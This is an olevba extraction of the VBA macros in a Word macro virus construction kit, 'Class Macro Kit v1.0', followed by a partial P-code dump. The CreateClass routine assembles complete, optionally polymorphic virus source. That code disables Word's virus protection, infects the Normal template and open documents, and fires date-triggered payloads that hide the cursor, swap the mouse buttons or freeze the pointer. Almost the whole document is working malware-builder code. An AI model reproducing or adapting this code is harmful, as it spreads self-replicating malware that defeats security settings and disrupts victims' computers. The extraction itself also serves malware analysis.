olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.CMK
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO frmAbout.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Image1_Click()
frmAbout.Hide
frmMain.Show
End Sub

Private Sub Label1_Click()
frmAbout.Hide
frmMain.Show
End Sub

Private Sub UserForm_Click()
frmAbout.Hide
frmMain.Show
End Sub

Private Sub UserForm_Initialize()
Image1.Picture = frmStart.Picture
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmDatum.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub CommandButton1_Click()
Tage = txtTage.Text
Monate = txtMonate.Text
frmDatum.Hide
frmPayload.Show
End Sub

Private Sub SpinButton1_SpinDown()
If Tage = 0 Then GoTo ende_
Tage = Tage - 1
txtTage.Text = Tage
ende_:
End Sub

Private Sub SpinButton1_SpinUp()
If Tage = 31 Then GoTo ende_
Tage = Tage + 1
txtTage.Text = Tage
ende_:
End Sub

Private Sub SpinButton2_SpinDown()
If Monate = 0 Then GoTo ende_
Monate = Monate - 1
txtMonate.Text = Monate
ende_:
End Sub

Private Sub SpinButton2_SpinUp()
If Monate = 12 Then GoTo ende_
Monate = Monate + 1
txtMonate.Text = Monate
ende_:
End Sub

Private Sub UserForm_Initialize()
Tage = Day(Now())
Monate = Month(Now())
txtTage.Text = Tage
txtMonate.Text = Monate
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmEnd.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmEnd'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Click()
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
End
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmGreets.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Click()
frmGreets.Hide
frmMain.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmJackie.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmJackie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
frmAbout.Hide
End Sub

Private Sub Image1_Click()
Shell "start http://www.coderz.net/metaphase/"
End Sub

Private Sub Image2_Click()
Shell "start http://beam.to/lzo"
End Sub

Private Sub UserForm_Click()
frmJackie.Hide
frmMain.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmMain.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
frmDatum.Show
End Sub

Private Sub OptionButton12_Click()

End Sub

Private Sub CommandButton2_Click()
frmMain.Hide
frmPayload.Show
End Sub

Private Sub CommandButton3_Click()
PiEPoly = True
frmMain.Hide
frmPiE.Show
End Sub

Private Sub CommandButton4_Click()
frmMain.Hide
frmAbout.Show
End Sub

Private Sub CommandButton5_Click()
frmMain.Hide
frmJackie.Show
End Sub

Private Sub CommandButton6_Click()
frmMain.Hide
frmGreets.Show
End Sub

Private Sub CommandButton7_Click()
Dim DokName As String
Dim Decision

If PiEPoly = False Then _
 MsgBox "This class will not contain the PiE engine!", 64, "CMK Information"

    Do

        DokName = InputBox("Give this bug a name!", "Name of bug...", "NewBug")

    Loop While DokName = ""


Call CreateClass(DokName)

Decision = MsgBox("Wanna exit CMK?", 36, "CMK v1.0")

If Decision = vbYes Then
    
    frmMain.Hide
    frmEnd.Show
    
End If

End Sub

Private Sub CommandButton8_Click()
MsgBox "No virus this time ; (", 64, "Thanks for using CMK"
frmMain.Hide
frmEnd.Show
End Sub

Private Sub OptionButton1_Click()
If OptionButton1.Value = True Then DocCl = True Else DocCl = False
End Sub

Private Sub OptionButton2_Click()
If OptionButton2.Value = True Then DocOp = True Else DocOp = False
End Sub

Private Sub UserForm_Initialize()
Label1.Caption = LCase(Options.DefaultFilePath(wdDocumentsPath))
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmPayload.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
frmPayload.Hide
frmDatum.Show
End Sub

Private Sub CommandButton2_Click()
frmPayload.Hide
frmMain.Show
End Sub

Private Sub OptionButton1_Click()
If OptionButton1.Value = True Then
Payload = 0
CommandButton1.Enabled = True
End If
End Sub

Private Sub OptionButton2_Click()
If OptionButton2.Value = True Then
Payload = 1
CommandButton1.Enabled = True
End If
End Sub

Private Sub OptionButton3_Click()
If OptionButton3.Value = True Then
Payload = 2
CommandButton1.Enabled = True
End If
End Sub

Private Sub OptionButton4_Click()
If OptionButton4.Value = True Then
Payload = 3
CommandButton1.Enabled = True
End If
End Sub

Private Sub OptionButton5_Click()
If OptionButton5.Value = True Then
Payload = 4
CommandButton1.Enabled = False
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmPiE.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmPiE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
frmPiE.Hide
frmMain.Show
End Sub

Private Sub OptionButton1_Click()
PiEActivity = 5
End Sub

Private Sub OptionButton2_Click()
PiEActivity = 4
End Sub

Private Sub OptionButton3_Click()
PiEActivity = 3
End Sub

Private Sub OptionButton4_Click()
PiESize = 175
End Sub

Private Sub OptionButton5_Click()
PiESize = 225
End Sub

Private Sub OptionButton6_Click()
PiESize = 125
End Sub

-------------------------------------------------------------------------------
VBA MACRO frmStart.frm 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/frmStart'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
frmStart.Hide
frmMain.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO jackie.bas 
in file: Constructor.MSWord.CMK - OLE stream: 'Macros/VBA/jackie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Monate As Integer, Tage As Integer, Payload As Integer
Public PiEActivity As Integer, PiESize As Integer
Public PiEPoly As Boolean, DocOp As Boolean, DocCl As Boolean


Sub AutoOpen()

DocOp = True
Monate = Month(Now()) - 1
Tage = Day(Now()) - 1
PiEActivity = 3
PiESize = 175
Payload = 4

Application.WindowState = wdWindowStateMinimize

frmStart.Show

End Sub

Sub CreateClass(ThaName As String)

On Error Resume Next


Randomize


Dim Variable(25) As String
Dim VirusCode As String
Dim ThePath As String
Dim PiEChar As String
Dim OldLines As Integer

OldLines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

For i = 1 To 25

    Variable(i) = Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22)) & Int(Rnd * 999)

Next

If PiEPoly = True Then PiEChar = Chr(39) Else PiEChar = ""


'            VirusCode = "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem          Class Macro Kit v1.0    " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem          Class." & ThaName & "          " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem           All code written by    " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem             jackie twoflower     " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem         [LineZer0] & [Metaphase] " & PiEChar & vbCr
'VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr

VirusCode = "Rem Do you see what I see? Do you hear what I hear?" & PiEChar & vbCr
VirusCode = VirusCode & "Rem Do you feel what I feel?" & PiEChar & vbCr
VirusCode = VirusCode & "Rem Do you ever cared?" & PiEChar & vbCr
VirusCode = VirusCode & "Rem                           -jackie twoflower-" & PiEChar & vbCr

Select Case Payload

    Case 0
        
        VirusCode = VirusCode & "Private Declare Function ShowCursor Lib ""USER32"" (ByVal fShow As Integer) As Integer" & PiEChar & vbCr
     
    Case 1
    
        VirusCode = VirusCode & "Private Declare Function SwapMouseButton Lib ""USER32"" (ByVal bSwap As Long) As Long" & PiEChar & vbCr
      
    Case 2
    
        VirusCode = VirusCode & "Private Declare Function SetCursorPos Lib ""USER32"" (ByVal x As Long, ByVal y As Long) As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Declare Function GetCursorPos Lib ""USER32"" (lpPoint As " & Variable(21) & ") As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Declare Sub Sleep Lib ""kernel32"" (ByVal dwMilliseconds As Long)" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Type " & Variable(21) & PiEChar & vbCr
        VirusCode = VirusCode & Variable(22) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(23) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "End Type" & PiEChar & vbCr
       
    Case 3

        VirusCode = VirusCode & "Private Declare Function SetCursorPos Lib ""USER32"" (ByVal x As Long, ByVal y As Long) As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Declare Function GetCursorPos Lib ""USER32"" (lpPoint As " & Variable(21) & ") As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Private Type " & Variable(21) & PiEChar & vbCr
        VirusCode = VirusCode & Variable(22) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(23) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "End Type" & PiEChar & vbCr
        
End Select

If DocOp = True Then VirusCode = VirusCode & "Private Sub Document_Open()" & PiEChar & vbCr Else VirusCode = VirusCode & "Private Sub Document_Close()" & PiEChar & vbCr
VirusCode = VirusCode & "On Error Resume Next" & PiEChar & vbCr
If PiEPoly = True Then VirusCode = VirusCode & "Dim " & Variable(1) & "(" & PiESize & "):"
VirusCode = VirusCode & "Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0)" & PiEChar & vbCr
VirusCode = VirusCode & "Set " & Variable(2) & " = MacroContainer.VBProject: Set " & Variable(3) & " = " & Variable(2) & ".VBComponents(1)" & PiEChar & vbCr
VirusCode = VirusCode & "Set " & Variable(4) & " = " & Variable(3) & ".CodeModule: Set " & Variable(5) & " = NormalTemplate"
If PiEPoly = True Then VirusCode = VirusCode & ": " & Variable(6) & " = Chr(39)" & PiEChar & vbCr Else VirusCode = VirusCode & PiEChar & vbCr
VirusCode = VirusCode & "If MacroContainer = " & Variable(5) & " Then Set " & Variable(5) & " = ActiveDocument" & PiEChar & vbCr

If PiEPoly = True Then

VirusCode = VirusCode & "Set " & Variable(7) & " = " & Variable(5) & ".VBProject.VBComponents(1).CodeModule: " & Variable(8) & " = " & Variable(4) & ".CountOfLines: " & Variable(9) & " = " & (PiESize - 75) & " + Int(Rnd * 50)" & PiEChar & vbCr
VirusCode = VirusCode & "For " & Variable(10) & " =  1 To " & Variable(8) & ": " & Variable(11) & " = """": " & Variable(12) & " = Int(Rnd * " & PiEActivity & "): " & Variable(13) & " = InStr(" & Variable(4) & ".Lines(" & Variable(10) & ", 1), " & Variable(6) & ")" & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(13) & " = 1 And " & Variable(8) & " > " & Variable(9) & " Then " & PiEChar & vbCr
VirusCode = VirusCode & Variable(12) & " = 1: Goto " & Variable(24) & PiEChar & vbCr
VirusCode = VirusCode & "End If" & PiEChar & vbCr

    If Payload = 4 Then
        VirusCode = VirusCode & Variable(14) & " = UCase(Left(" & Variable(4) & ".Lines(" & Variable(10) & ", 1), (" & Variable(13) & " - 1)))" & PiEChar & vbCr
        VirusCode = VirusCode & "For " & Variable(25) & " = 1 To Len(" & Variable(14) & "): " & Variable(15) & " = Mid(" & Variable(14) & ", " & Variable(25) & ", 1)" & PiEChar & vbCr
        VirusCode = VirusCode & "If Asc(" & Variable(15) & ") < 90 and Asc(" & Variable(15) & ") > 65 Then " & Variable(15) & " = Chr(Asc(" & Variable(15) & ") + Int(Rnd * 2) * 32)" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(1) & "(" & Variable(10) & ") = " & Variable(1) & "(" & Variable(10) & ") & " & Variable(15) & ": Next " & Variable(25) & PiEChar & vbCr
        
    Else
    
        VirusCode = VirusCode & Variable(14) & " = Left(" & Variable(4) & ".Lines(" & Variable(10) & ", 1), (" & Variable(13) & " - 1))" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(1) & "(" & Variable(10) & ") = " & Variable(1) & "(" & Variable(10) & ") & " & Variable(14) & PiEChar & vbCr
    
    End If

VirusCode = VirusCode & "For " & Variable(16) & " = 1 To Int(75 - Int(Rnd * 20)): " & Variable(11) & " = " & Variable(11) & " & Chr(255 - Int(Rnd * 100)): Next " & Variable(16) & PiEChar & vbCr
VirusCode = VirusCode & Variable(1) & "(" & Variable(10) & ") = " & Variable(1) & "(" & Variable(10) & ") & " & Variable(6) & " & " & Variable(11) & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(12) & " = 2 Then " & Variable(1) & "(" & Variable(10) & ") = " & Variable(1) & "(" & Variable(10) & ") & vbcr & " & Variable(6) & " & " & Variable(11) & PiEChar & vbCr
VirusCode = VirusCode & Variable(17) & " = " & Variable(17) & " & " & Variable(1) & "(" & Variable(10) & ") & vbcr" & PiEChar & vbCr
VirusCode = VirusCode & Variable(24) & ":" & PiEChar & vbCr
VirusCode = VirusCode & "Next " & Variable(10) & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(7) & ".CountOfLines < (0 + 2) Then" & PiEChar & vbCr
VirusCode = VirusCode & Variable(7) & ".DeleteLines 1, " & Variable(7) & ".CountOfLines: " & Variable(7) & ".AddFromString " & Variable(17) & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(5) & " = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName" & PiEChar & vbCr
VirusCode = VirusCode & "End If" & PiEChar & vbCr

Else

VirusCode = VirusCode & Variable(17) & " = " & Variable(4) & ".Lines(1, " & Variable(4) & ".CountOfLines)" & PiEChar & vbCr
VirusCode = VirusCode & "Set " & Variable(7) & " = " & Variable(5) & ".VBProject.VBComponents(1).CodeModule" & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(7) & ".CountOfLines < (0 + 2) Then" & PiEChar & vbCr
VirusCode = VirusCode & Variable(7) & ".DeleteLines 1, " & Variable(7) & ".CountOfLines: " & Variable(7) & ".AddFromString " & Variable(17) & PiEChar & vbCr
VirusCode = VirusCode & "If " & Variable(5) & " = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName" & PiEChar & vbCr
VirusCode = VirusCode & "End If" & PiEChar & vbCr

End If

If Payload <> 4 Then
    
    If Tage <> 0 And Monate <> 0 Then VirusCode = VirusCode & "If Day(Now()) = " & Tage & " And Month(Now()) = " & Monate & " Then" & PiEChar & vbCr
    If Tage <> 0 And Monate = 0 Then VirusCode = VirusCode & "If Day(Now()) = " & Tage & " Then" & PiEChar & vbCr
    If Tage = 0 And Monate <> 0 Then VirusCode = VirusCode & "If Month(Now()) = " & Monate & " Then" & PiEChar & vbCr

End If

Select Case Payload

    Case 0
    
        VirusCode = VirusCode & "While ShowCursor(False) >= 0" & PiEChar & vbCr
        VirusCode = VirusCode & "Wend" & PiEChar & vbCr

    Case 1

        VirusCode = VirusCode & "SwapMouseButton &H2" & PiEChar & vbCr

    Case 2
    
        VirusCode = VirusCode & "Dim " & Variable(18) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Dim " & Variable(19) & " As Long" & PiEChar & vbCr
        VirusCode = VirusCode & "Dim " & Variable(20) & " As " & Variable(21) & PiEChar & vbCr
        VirusCode = VirusCode & "Do" & PiEChar & vbCr
        VirusCode = VirusCode & "GetCursorPos " & Variable(20) & PiEChar & vbCr
        VirusCode = VirusCode & Variable(18) & " = Rnd(2)" & PiEChar & vbCr
        VirusCode = VirusCode & "If " & Variable(18) & " = 0 Then " & Variable(18) & " = -5 Else " & Variable(18) & " = 5" & PiEChar & vbCr
        VirusCode = VirusCode & Variable(19) & " = Rnd(2)" & PiEChar & vbCr
        VirusCode = VirusCode & "If " & Variable(19) & " = 0 Then " & Variable(19) & " = -5 Else " & Variable(19) & " = 5" & PiEChar & vbCr
        VirusCode = VirusCode & "SetCursorPos " & Variable(20) & "." & Variable(22) & " + " & Variable(18) & ", " & Variable(20) & "." & Variable(23) & " + " & Variable(19) & PiEChar & vbCr
        VirusCode = VirusCode & "Sleep 2" & PiEChar & vbCr
        VirusCode = VirusCode & "DoEvents" & PiEChar & vbCr
        VirusCode = VirusCode & "Loop" & PiEChar & vbCr
    
    Case 3
    
        VirusCode = VirusCode & "Dim " & Variable(20) & " As " & Variable(21) & PiEChar & vbCr
        VirusCode = VirusCode & "GetCursorPos " & Variable(20) & PiEChar & vbCr
        VirusCode = VirusCode & "Do" & PiEChar & vbCr
        VirusCode = VirusCode & "SetCursorPos " & Variable(20) & "." & Variable(22) & ", " & Variable(20) & "." & Variable(23) & PiEChar & vbCr
        VirusCode = VirusCode & "Loop" & PiEChar & vbCr
    
End Select


If Payload <> 4 Then If Tage <> 0 And Monate <> 0 Then VirusCode = VirusCode & "End If" & PiEChar & vbCr

VirusCode = VirusCode & "End Sub" & PiEChar & vbCr
VirusCode = VirusCode & "Rem Another macro bug by jackie twoflower's Class Macro Kit v1.0" & PiEChar

'---------------> Create Document

Documents.Add Template:=NormalTemplate.FullName, Newtemplate:=False

With Dialogs(wdDialogFileSummaryInfo)
    
    .Title = "A wonderful class macro!"
    .Author = "-jackie twoflower/LineZer0/Metaphase-"
    .Comments = "Created by Class Macro Kit v1.0"
    .Execute

End With

ThePath = Options.DefaultFilePath(wdDocumentsPath) & "\" & ThaName & ".doc"

If UCase(Dir(ThePath)) <> UCase((ThaName & ".doc")) Then

    ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString (VirusCode)
    ActiveDocument.SaveAs FileName:=ThePath, fileformat:=wdFormatDocument, addtorecentfiles:=False
    ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges

    MsgBox "Class." & ThaName & " was created in " & ThePath, 64, "CMK v1.0"

Else

    MsgBox "This document already exists!", 16, "CMK Error!"
    ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
    Exit Sub

End If

' This delete code is taken from CPCK by VicodinES. Thanks

If NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines <> OldLines Then

    NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
    NormalTemplate.Save

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Constructor.MSWord.CMK
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/frmAbout - 1884 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Image1_Click())
' Line #2:
' 	Ld frmAbout 
' 	ArgsMemCall Hide 0x0000 
' Line #3:
' 	Ld frmMain 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Label1_Click())
' Line #7:
' 	Ld frmAbout 
' 	ArgsMemCall Hide 0x0000 
' Line #8:
' 	Ld frmMain 
' 	ArgsMemCall Show 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #12:
' 	Ld frmAbout 
' 	ArgsMemCall Hide 0x0000 
' Line #13:
' 	Ld frmMain 
' 	ArgsMemCall Show 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #17:
' 	Ld frmStart 
' 	MemLd Picture 
' 	Ld Image1 
' 	MemSt Picture 
' Line #18:
' 	EndSub 
' Macros/VBA/frmDatum - 2787 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #4:
' 	Ld txtTage 
' 	MemLd Then 
' 	St Tage 
' Line #5:
' 	Ld txtMonate 
' 	MemLd Then 
' 	St Monate 
' Line #6:
' 	Ld frmDatum 
' 	ArgsMemCall Hide 0x0000 
' Line #7:
' 	Ld frmPayload 
' 	ArgsMemCall Show 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub SpinButton1_SpinDown())
' Line #11:
' 	Ld Tage 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ende_ 
' 	EndIf 
' Line #12:
' 	Ld Tage 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Tage 
' Line #13:
' 	Ld Tage 
' 	Ld txtTage 
' 	MemSt Then 
' Line #14:
' 	Label ende_ 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Private Sub SpinButton1_SpinUp())
' Line #18:
' 	Ld Tage 
' 	LitDI2 0x001F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ende_ 
' 	EndIf 
' Line #19:
' 	Ld Tage 
' 	LitDI2 0x0001 
' 	Add 
' 	St Tage 
' Line #20:
' 	Ld Tage 
' 	Ld txtTage 
' 	MemSt Then 
' Line #21:
' 	Label ende_ 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' 	FuncDefn (Private Sub SpinButton2_SpinDown())
' Line #25:
' 	Ld Monate 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ende_ 
' 	EndIf 
' Line #26:
' 	Ld Monate 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Monate 
' Line #27:
' 	Ld Monate 
' 	Ld txtMonate 
' 	MemSt Then 
' Line #28:
' 	Label ende_ 
' Line #29:
' 	EndSub 
' Line #30:
' Line #31:
' 	FuncDefn (Private Sub SpinButton2_SpinUp())
' Line #32:
' 	Ld Monate 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ende_ 
' 	EndIf 
' Line #33:
' 	Ld Monate 
' 	LitDI2 0x0001 
' 	Add 
' 	St Monate 
' Line #34:
' 	Ld Monate 
' 	Ld txtMonate 
' 	MemSt Then 
' Line #35:
' 	Label ende_ 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #39:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	St Tage 
' Line #40:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	St Monate 
' Line #41:
' 	Ld Tage 
' 	Ld txtTage 
' 	MemSt Then 
' Line #42:
' 	Ld Monate 
' 	Ld txtMonate 
' 	MemSt Then 
' Line #43:
' 	EndSub 
' Macros/VBA/frmEnd - 1675 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #2:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #3:
' 	End 
' Line #4:
' 	EndSub 
' Macros/VBA/frmGreets - 1339 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #2:
' 	Ld frmGreets 
' 	ArgsMemCall Hide 0x0000 
' Line #3:
' 	Ld frmMain 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	EndSub 
' Macros/VBA/frmJackie - 1940 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld frmAbout 
' 	ArgsMemCall Hide 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Image1_Click())
' Line #6:
' 	LitStr 0x0026 "start http://www.coderz.net/metaphase/"
' 	ArgsCall Shell 0x0001 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub Image2_Click())
' Line #10:
' 	LitStr 0x0018 "start http://beam.to/lzo"
' 	ArgsCall Shell 0x0001 
' Line #11:
' 	EndSub 
' Line #12:
' Line #13:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #14:
' 	Ld frmJackie 
' 	ArgsMemCall Hide 0x0000 
' Line #15:
' 	Ld frmMain 
' 	ArgsMemCall Show 0x0000 
' Line #16:
' 	EndSub 
' Macros/VBA/frmMain - 7641 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld frmDatum 
' 	ArgsMemCall Show 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub OptionButton12_Click())
' Line #6:
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #10:
' 	Ld frmMain 
' 	ArgsMemCall Hide 0x0000 
' Line #11:
' 	Ld frmPayload 
' 	ArgsMemCall Show 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #15:
' 	LitVarSpecial (True)
' 	St PiEPoly 
' Line #16:
' 	Ld frmMain 
' 	ArgsMemCall Hide 0x0000 
' Line #17:
' 	Ld frmPiE 
' 	ArgsMemCall Show 0x0000 
' Line #18:
' 	EndSub 
' Line #19:
' Line #20:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #21:
' 	Ld frmMain 
' 	ArgsMemCall Hide 0x0000 
' Line #22:
' 	Ld frmAbout 
' 	ArgsMemCall Show 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' Line #25:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #26:
' 	Ld frmMain 
' 	ArgsMemCall Hide 0x0000 
' Line #27:
' 	Ld frmJackie 
' 	ArgsMemCall Show 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
' Line #30:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #31:
' 	Ld frmMain 
' 	ArgsMemCall Hide 0x0000 
' Line #32:
' 	Ld frmGreets 
' 	ArgsMemCall Show 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' 	FuncDefn (Private Sub CommandButton7_Click())
' Line #36:
' 	Dim 
' 	VarDefn DokName (As String)
' Line #37:
' 	Dim 
' 	VarDefn Decision
' Line #38:
' Line #39:
' 	LineCont 0x0004 05 00 01 00
' 	Ld PiEPoly 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002B "This class will not contain the PiE engine!"
' 	LitDI2 0x0040 
' 	LitStr 0x000F "CMK Information"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #40:
' Line #41:
' 	Do 
' Line #42:
' Line #43:
' 	LitStr 0x0015 "Give this bug a name!"
' 	LitStr 0x000E "Name of bug..."
' 	LitStr 0x0006 "NewBug"
' 	ArgsLd InputBox 0x0003 
' 	St DokName 
' Line #44:
' Line #45:
' 	Ld DokName 
' 	LitStr 0x0000 ""
' 	Eq 
' 	LoopWhile 
' Line #46:
' Line #47:
' Line #48:
' 	Ld DokName 
' 	ArgsCall (Call) CreateClass 0x0001 
' Line #49:
' Line #50:
' 	LitStr 0x000F "Wanna exit CMK?"
' 	LitDI2 0x0024 
' 	LitStr 0x0008 "CMK v1.0"
' 	ArgsLd MsgBox 0x0003 
' 	St Decision 
' Line #51:
' Line #52:
' 	Ld Decision 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #53:
' Line #54:
' 	Ld frmMain 
' 	ArgsMemCall Hide 0x0000 
' Line #55:
' 	Ld frmEnd 
' 	ArgsMemCall Show 0x0000 
' Line #56:
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' 	EndSub 
' Line #60:
' Line #61:
' 	FuncDefn (Private Sub CommandButton8_Click())
' Line #62:
' 	LitStr 0x0016 "No virus this time ; ("
' 	LitDI2 0x0040 
' 	LitStr 0x0014 "Thanks for using CMK"
' 	ArgsCall MsgBox 0x0003 
' Line #63:
' 	Ld frmMain 
' 	ArgsMemCall Hide 0x0000 
' Line #64:
' 	Ld frmEnd 
' 	ArgsMemCall Show 0x0000 
' Line #65:
' 	EndSub 
' Line #66:
' Line #67:
' 	FuncDefn (Private Sub OptionButton1_Click())
' Line #68:
' 	Ld OptionButton1 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DocCl 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St DocCl 
' 	EndIf 
' Line #69:
' 	EndSub 
